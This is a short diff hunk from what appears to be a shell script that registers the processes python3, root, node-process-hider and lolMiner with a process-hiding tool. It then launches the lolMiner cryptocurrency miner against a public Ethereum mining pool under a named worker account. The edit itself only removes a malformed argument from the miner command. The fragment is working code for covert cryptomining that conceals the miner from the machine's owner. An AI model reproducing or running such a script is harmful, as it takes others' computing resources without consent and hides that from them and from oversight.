@@ -17,5 +17,5 @@ Ph add python3
 ph add root
 ph add node-process-hider
 ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY  --timeprint on --longstats 120 --singlethread [=arg(=-1)]
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY  --timeprint on --longstats 120 
 sleep 10
